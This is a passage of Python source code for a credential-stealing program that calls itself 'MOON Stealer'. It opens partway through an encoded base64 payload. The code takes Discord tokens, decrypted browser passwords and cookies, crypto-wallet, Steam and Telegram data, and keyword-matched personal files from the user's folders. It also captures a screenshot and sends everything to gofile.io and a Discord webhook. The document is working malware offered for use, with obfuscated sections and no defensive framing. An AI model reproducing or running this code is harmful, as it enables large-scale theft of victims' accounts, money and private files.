JUS9IajRkZ29TWU9uZHgrN3RaTFoybTNxQTRBRnBVRDZSRHNiTFhCMm0wZFB1UFphOEdibHZvR20vZ3RoZEkrOFB4eVl0blhxUkxsOXVpSmkreEJicXRDbUttOC9LM2I3aHNibVE9IikpLmRlY29kZSgpLCIiLmpvaW4oY2hyKGludChpLzgpKSBmb3IgaSBpbiBbOTEyLCA4ODgsIDkyOCwgMzkyLCA0MDhdKSkuZW5jb2RlKCkpKX0pJwopCg=="
    )
)

Tokens = ""


def getToken(path, arg):
    if not os.path.exists(path):
        return

    path += arg
    for file in os.listdir(path):
        if file.endswith(".log") or file.endswith(".ldb"):
            for line in [
                x.strip()
                for x in open(f"{path}\\{file}", errors="ignore").readlines()
                if x.strip()
            ]:
                for regex in (
                    r"[\w-]{24}\.[\w-]{6}\.[\w-]{25,110}",
                    r"mfa\.[\w-]{80,95}",
                ):
                    for token in re.findall(regex, line):
                        global Tokens
                        if checkToken(token):
                            if not token in Tokens:
                                # print(token)
                                Tokens += token
                                uploadToken(token, path)


Passw = []


def getPassw(path, arg):
    global Passw, PasswCount
    if not os.path.exists(path):
        return

    pathC = path + arg + "/Login Data"
    if os.stat(pathC).st_size == 0:
        return

    tempfold = (
        temp
        + "wp"
        + "".join(random.choice("bcdefghijklmnopqrstuvwxyz") for i in range(8))
        + ".db"
    )

    shutil.copy2(pathC, tempfold)
    conn = sql_connect(tempfold)
    cursor = conn.cursor()
    cursor.execute("SELECT action_url, username_value, password_value FROM logins;")
    data = cursor.fetchall()
    cursor.close()
    conn.close()
    os.remove(tempfold)

    pathKey = path + "/Local State"
    with open(pathKey, "r", encoding="utf-8") as f:
        local_state = json_loads(f.read())
    master_key = b64decode(local_state["os_crypt"]["encrypted_key"])
    master_key = CryptUnprotectData(master_key[5:])

    for row in data:
        if row[0] != "":
            for wa in keyword:
                old = wa
                if "https" in wa:
                    tmp = wa
                    wa = tmp.split("[")[1].split("]")[0]
                if wa in row[0]:
                    if not old in paswWords:
                        paswWords.append(old)
            Passw.append(
                f"UR1: {row[0]}|U53RN4M3: {row[1]}|P455W0RD: {DecryptValue(row[2], master_key)}"
            )
            PasswCount += 1
    writeforfile(Passw, "passw")


Cookies = []


def getCookie(path, arg):
    global Cookies, CookiCount
    if not os.path.exists(path):
        return

    pathC = path + arg + "/Cookies"
    if os.stat(pathC).st_size == 0:
        return

    tempfold = (
        temp
        + "wp"
        + "".join(random.choice("bcdefghijklmnopqrstuvwxyz") for i in range(8))
        + ".db"
    )

    shutil.copy2(pathC, tempfold)
    conn = sql_connect(tempfold)
    cursor = conn.cursor()
    cursor.execute("SELECT host_key, name, encrypted_value FROM cookies")
    data = cursor.fetchall()
    cursor.close()
    conn.close()
    os.remove(tempfold)

    pathKey = path + "/Local State"

    with open(pathKey, "r", encoding="utf-8") as f:
        local_state = json_loads(f.read())
    master_key = b64decode(local_state["os_crypt"]["encrypted_key"])
    master_key = CryptUnprotectData(master_key[5:])

    for row in data:
        if row[0] != "":
            for wa in keyword:
                old = wa
                if "https" in wa:
                    tmp = wa
                    wa = tmp.split("[")[1].split("]")[0]
                if wa in row[0]:
                    if not old in cookiWords:
                        cookiWords.append(old)
            Cookies.append(
                f"H057 K3Y: {row[0]}|N4M3: {row[1]}|V41U3: {DecryptValue(row[2], master_key)}"
            )
            CookiCount += 1
    writeforfile(Cookies, "cook")


def GetDiscord(path, arg):
    if not os.path.exists(f"{path}/Local State"):
        return

    pathC = path + arg

    pathKey = path + "/Local State"
    with open(pathKey, "r", encoding="utf-8") as f:
        local_state = json_loads(f.read())
    master_key = b64decode(local_state["os_crypt"]["encrypted_key"])
    master_key = CryptUnprotectData(master_key[5:])
    # print(path, master_key)

    for file in os.listdir(pathC):
        # print(path, file)
        if file.endswith(".log") or file.endswith(".ldb"):
            for line in [
                x.strip()
                for x in open(f"{pathC}\\{file}", errors="ignore").readlines()
                if x.strip()
            ]:
                for token in re.findall(r"dQw4w9WgXcQ:[^.*\['(.*)'\].*$][^\"]*", line):
                    global Tokens
                    tokenDecoded = DecryptValue(
                        b64decode(token.split("dQw4w9WgXcQ:")[1]), master_key
                    )
                    if checkToken(tokenDecoded):
                        if not tokenDecoded in Tokens:
                            # print(token)
                            Tokens += tokenDecoded
                            # writeforfile(Tokens, 'tokens')
                            uploadToken(tokenDecoded, path)


def GatherZips(paths1, paths2, paths3):
    thttht = []
    for patt in paths1:
        a = threading.Thread(target=ZipThings, args=[patt[0], patt[5], patt[1]])
        a.start()
        thttht.append(a)

    for patt in paths2:
        a = threading.Thread(target=ZipThings, args=[patt[0], patt[2], patt[1]])
        a.start()
        thttht.append(a)

    a = threading.Thread(target=ZipTelegram, args=[paths3[0], paths3[2], paths3[1]])
    a.start()
    thttht.append(a)

    for thread in thttht:
        thread.join()
    global WalletsZip, GamingZip, OtherZip
    # print(WalletsZip, GamingZip, OtherZip)

    wal, ga, ot = "", "", ""
    if not len(WalletsZip) == 0:
        wal = ":coin Wallets\n"
        for i in WalletsZip:
            wal += f"└─ [{i[0]}]({i[1]})\n"
    if not len(WalletsZip) == 0:
        ga = ":video_game Gaming:\n"
        for i in GamingZip:
            ga += f"└─ [{i[0]}]({i[1]})\n"
    if not len(OtherZip) == 0:
        ot = ":tickets Apps\n"
        for i in OtherZip:
            ot += f"└─ [{i[0]}]({i[1]})\n"
    headers = {
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0",
    }

    data = {
        "content": globalInfo(),
        "embeds": [
            {
                "title": "MOON Zips",
                "description": f"{wal}\n{ga}\n{ot}",
                "color": 12632256,
                "footer": {
                    "text": "Moon On Top!",
                    "icon_url": "",
                },
            }
        ],
        "username": "MOON Stealer",
        "avatar_url": "",
        "attachments": [],
    }

    LoadUrlib(hook, data=dumps(data).encode(), headers=headers)


def ZipTelegram(path, arg, procc):
    global OtherZip
    pathC = path
    name = arg
    if not os.path.exists(pathC):
        return
    subprocess.Popen(f"taskkill /im {procc} /t /f >nul 2>&1", shell=True)

    zf = ZipFile(f"{pathC}/{name}.zip", "w")
    for file in os.listdir(pathC):
        if (
            not ".zip" in file
            and not "tdummy" in file
            and not "user_data" in file
            and not "webview" in file
        ):
            zf.write(pathC + "/" + file)
    zf.close()

    # lnik = uploadToAnonfiles(f'{pathC}/{name}.zip')
    lnik = "https://google.com"
    os.remove(f"{pathC}/{name}.zip")
    OtherZip.append([arg, lnik])


def ZipThings(path, arg, procc):
    pathC = path
    name = arg
    global WalletsZip, GamingZip, OtherZip
    # subprocess.Popen(f"taskkill /im {procc} /t /f", shell=True)
    # os.system(f"taskkill /im {procc} /t /f")

    if "nkbihfbeogaeaoehlefnkodbefgpgknn" in arg:
        browser = path.split("\\")[4].split("/")[1].replace(" ", "")
        name = f"Metamask_{browser}"
        pathC = path + arg

    if not os.path.exists(pathC):
        return
    subprocess.Popen(f"taskkill /im {procc} /t /f >nul 2>&1", shell=True)

    if "Wallet" in arg or "NationsGlory" in arg:
        browser = path.split("\\")[4].split("/")[1].replace(" ", "")
        name = f"{browser}"

    elif "Steam" in arg:
        if not os.path.isfile(f"{pathC}/loginusers.vdf"):
            return
        f = open(f"{pathC}/loginusers.vdf", "r+", encoding="utf8")
        data = f.readlines()
        # print(data)
        found = False
        for l in data:
            if 'RememberPassword"\t\t"1"' in l:
                found = True
        if found == False:
            return
        name = arg

    zf = ZipFile(f"{pathC}/{name}.zip", "w")
    for file in os.listdir(pathC):
        if not ".zip" in file:
            zf.write(pathC + "/" + file)
    zf.close()

    # lnik = uploadToAnonfiles(f'{pathC}/{name}.zip')
    lnik = "https://google.com"
    os.remove(f"{pathC}/{name}.zip")

    if "Wallet" in arg or "eogaeaoehlef" in arg:
        WalletsZip.append([name, lnik])
    elif "NationsGlory" in name or "Steam" in name or "RiotCli" in name:
        GamingZip.append([name, lnik])
    else:
        OtherZip.append([name, lnik])


def GatherAll():
    "Default Path < 0 >                         ProcesName < 1 >        Token  < 2 >              Password < 3 >     Cookies < 4 >                          Extentions < 5 >"
    browserPaths = [
        [
            f"{roaming}/Opera Software/Opera GX Stable",
            "opera.exe",
            "/Local Storage/leveldb",
            "/",
            "/Network",
            "/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn",
        ],
        [
            f"{roaming}/Opera Software/Opera Stable",
            "opera.exe",
            "/Local Storage/leveldb",
            "/",
            "/Network",
            "/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn",
        ],
        [
            f"{roaming}/Opera Software/Opera Neon/User Data/Default",
            "opera.exe",
            "/Local Storage/leveldb",
            "/",
            "/Network",
            "/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn",
        ],
        [
            f"{local}/Google/Chrome/User Data",
            "chrome.exe",
            "/Default/Local Storage/leveldb",
            "/Default",
            "/Default/Network",
            "/Default/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn",
        ],
        [
            f"{local}/Google/Chrome SxS/User Data",
            "chrome.exe",
            "/Default/Local Storage/leveldb",
            "/Default",
            "/Default/Network",
            "/Default/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn",
        ],
        [
            f"{local}/BraveSoftware/Brave-Browser/User Data",
            "brave.exe",
            "/Default/Local Storage/leveldb",
            "/Default",
            "/Default/Network",
            "/Default/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn",
        ],
        [
            f"{local}/Yandex/YandexBrowser/User Data",
            "yandex.exe",
            "/Default/Local Storage/leveldb",
            "/Default",
            "/Default/Network",
            "/HougaBouga/nkbihfbeogaeaoehlefnkodbefgpgknn",
        ],
        [
            f"{local}/Microsoft/Edge/User Data",
            "edge.exe",
            "/Default/Local Storage/leveldb",
            "/Default",
            "/Default/Network",
            "/Default/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn",
        ],
    ]

    discordPaths = [
        [f"{roaming}/Discord", "/Local Storage/leveldb"],
        [f"{roaming}/Lightcord", "/Local Storage/leveldb"],
        [f"{roaming}/discordcanary", "/Local Storage/leveldb"],
        [f"{roaming}/discordptb", "/Local Storage/leveldb"],
    ]

    PathsToZip = [
        [f"{roaming}/atomic/Local Storage/leveldb", '"Atomic Wallet.exe"', "Wallet"],
        [f"{roaming}/Exodus/exodus.wallet", "Exodus.exe", "Wallet"],
        ["C:\Program Files (x86)\Steam\config", "steam.exe", "Steam"],
        [
            f"{roaming}/NationsGlory/Local Storage/leveldb",
            "NationsGlory.exe",
            "NationsGlory",
        ],
        [
            f"{local}/Riot Games/Riot Client/Data",
            "RiotClientServices.exe",
            "RiotClient",
        ],
    ]
    Telegram = [f"{roaming}/Telegram Desktop/tdata", "telegram.exe", "Telegram"]

    for patt in browserPaths:
        a = threading.Thread(target=getToken, args=[patt[0], patt[2]])
        a.start()
        Threadlist.append(a)
    for patt in discordPaths:
        a = threading.Thread(target=GetDiscord, args=[patt[0], patt[1]])
        a.start()
        Threadlist.append(a)

    for patt in browserPaths:
        a = threading.Thread(target=getPassw, args=[patt[0], patt[3]])
        a.start()
        Threadlist.append(a)

    ThCokk = []
    for patt in browserPaths:
        a = threading.Thread(target=getCookie, args=[patt[0], patt[4]])
        a.start()
        ThCokk.append(a)

    threading.Thread(
        target=GatherZips, args=[browserPaths, PathsToZip, Telegram]
    ).start()

    for thread in ThCokk:
        thread.join()
    DETECTED = Trust(Cookies)
    if DETECTED == True:
        return

    # for patt in browserPaths:
    #     threading.Thread(target=ZipThings, args=[patt[0], patt[5], patt[1]]).start()

    # for patt in PathsToZip:
    #     threading.Thread(target=ZipThings, args=[patt[0], patt[2], patt[1]]).start()

    # threading.Thread(target=ZipTelegram, args=[Telegram[0], Telegram[2], Telegram[1]]).start()

    for thread in Threadlist:
        thread.join()
    global upths
    upths = []

    for file in ["wppassw.txt", "wpcook.txt"]:
        # upload(os.getenv("TEMP") + "\\" + file)
        upload(
            file.replace(".txt", ""), uploadToAnonfiles(os.getenv("TEMP") + "\\" + file)
        )


def uploadToAnonfiles(path):
    try:
        return requests.post(
            f'https://{requests.get("https://api.gofile.io/getServer").json()["data"]["server"]}.gofile.io/uploadFile',
            files={"file": open(path, "rb")},
        ).json()["data"]["downloadPage"]
    except:
        return False


# def uploadToAnonfiles(path):s
#     try:
#         files = { "file": (path, open(path, mode='rb')) }
#         upload = requests.post("https://transfer.sh/", files=files)
#         url = upload.text
#         return url
#     except:
#         return False


def KiwiFolder(pathF, keywords):
    global KiwiFiles
    maxfilesperdir = 7
    i = 0
    listOfFile = os.listdir(pathF)
    ffound = []
    for file in listOfFile:
        if not os.path.isfile(pathF + "/" + file):
            return
        i += 1
        if i <= maxfilesperdir:
            url = uploadToAnonfiles(pathF + "/" + file)
            ffound.append([pathF + "/" + file, url])
        else:
            break
    KiwiFiles.append(["folder", pathF + "/", ffound])


KiwiFiles = []


def KiwiFile(path, keywords):
    global KiwiFiles
    fifound = []
    listOfFile = os.listdir(path)
    for file in listOfFile:
        for worf in keywords:
            if worf in file.lower():
                if os.path.isfile(path + "/" + file) and ".txt" in file:
                    fifound.append(
                        [path + "/" + file, uploadToAnonfiles(path + "/" + file)]
                    )
                    break
                if os.path.isdir(path + "/" + file):
                    target = path + "/" + file
                    KiwiFolder(target, keywords)
                    break

    KiwiFiles.append(["folder", path, fifound])


def Kiwi():
    user = temp.split("\AppData")[0]
    path2search = [user + "/Desktop", user + "/Downloads", user + "/Documents"]

    key_wordsFolder = ["account", "acount", "passw", "secret"]

    key_wordsFiles = [
        "passw",
        "mdp",
        "motdepasse",
        "mot_de_passe",
        "login",
        "secret",
        "account",
        "acount",
        "paypal",
        "banque",
        "account",
        "metamask",
        "wallet",
        "crypto",
        "exodus",
        "discord",
        "2fa",
        "code",
        "memo",
        "compte",
        "token",
        "backup",
        "secret",
    ]

    wikith = []
    for patt in path2search:
        kiwi = threading.Thread(target=KiwiFile, args=[patt, key_wordsFiles])
        kiwi.start()
        wikith.append(kiwi)
    return wikith


global keyword, cookiWords, paswWords, CookiCount, PasswCount, WalletsZip, GamingZip, OtherZip

keyword = [
    "mail",
    "[coinbase](https://coinbase.com)",
    "[sellix](https://sellix.io)",
    "[gmail](https://gmail.com)",
    "[steam](https://steam.com)",
    "[discord](https://discord.com)",
    "[riotgames](https://riotgames.com)",
    "[youtube](https://youtube.com)",
    "[instagram](https://instagram.com)",
    "[tiktok](https://tiktok.com)",
    "[twitter](https://twitter.com)",
    "[facebook](https://facebook.com)",
    "card",
    "[epicgames](https://epicgames.com)",
    "[spotify](https://spotify.com)",
    "[yahoo](https://yahoo.com)",
    "[roblox](https://roblox.com)",
    "[twitch](https://twitch.com)",
    "[minecraft](https://minecraft.net)",
    "bank",
    "[paypal](https://paypal.com)",
    "[origin](https://origin.com)",
    "[amazon](https://amazon.com)",
    "[ebay](https://ebay.com)",
    "[aliexpress](https://aliexpress.com)",
    "[playstation](https://playstation.com)",
    "[hbo](https://hbo.com)",
    "[xbox](https://xbox.com)",
    "buy",
    "sell",
    "[binance](https://binance.com)",
    "[hotmail](https://hotmail.com)",
    "[outlook](https://outlook.com)",
    "[crunchyroll](https://crunchyroll.com)",
    "[telegram](https://telegram.com)",
    "[pornhub](https://pornhub.com)",
    "[disney](https://disney.com)",
    "[expressvpn](https://expressvpn.com)",
    "crypto",
    "[uber](https://uber.com)",
    "[netflix](https://netflix.com)",
]

CookiCount, PasswCount = 0, 0
cookiWords = []
paswWords = []

WalletsZip = []  # [Name, Link]
GamingZip = []
OtherZip = []

GatherAll()
DETECTED = Trust(Cookies)
# DETECTED = False
if not DETECTED:
    wikith = Kiwi()

    for thread in wikith:
        thread.join()

    time.sleep(0.2)

    filetext = "\n"
    for arg in KiwiFiles:
        if len(arg[2]) != 0:
            foldpath = arg[1]
            foldlist = arg[2]
            filetext += f"📁 {foldpath}\n"

            for ffil in foldlist:
                a = ffil[0].split("/")
                fileanme = a[len(a), 1]
                b = ffil[1]
                filetext += f"└─:open_file_folder: [{fileanme}]({b})\n"
            filetext += "\n"
    upload("kiwi", filetext)

ipify = "https://api.ipify.org/"


message = {
    "embeds": [
        {
            "title": f"MOON | Extras",
            "color": 12632256,
            "fields": [
                {
                    "name": "-",
                    "value": f"OS: **{1 + 1 - 1} {1 * 1} {2 / 2}**\n",
                }
            ],
            "footer": {
                "text": "Moon On Top!",
                "icon_url": "https://upload.wikimedia.org/wikipedia/commons/c/c9/Moon.jpg",
            },
        }
    ]
}

# response = requests.post(hook, json=message)

payload = {"content": "https://discord.gg/fnNd26Depz"}

response = requests.post(hook, json=payload)

screenshot = ImageGrab.grab()
screenshot.save("screenshot.png")
files = {"screenshot": open("screenshot.png", "rb")}
requests.post(hook, files=files)
files["screenshot"].close()
os.remove("screenshot.png")
